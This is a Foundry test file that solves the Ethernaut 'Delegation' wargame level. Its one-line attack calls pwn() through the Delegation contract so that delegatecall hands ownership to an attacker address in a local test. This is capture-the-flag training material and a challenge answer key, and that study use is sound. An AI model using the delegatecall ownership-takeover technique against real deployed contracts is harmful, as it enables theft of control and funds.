// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {DelegationFactory} from "../src/levels/06-DelegationFactory.sol";
import {Delegation, Delegate} from "../src/levels/06-Delegation.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract DelegationSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    DelegationFactory internal factory;

    function solution(Delegation target) internal virtual {
        Delegate(address(target)).pwn();
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new DelegationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Delegation delegationContract = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(delegationContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
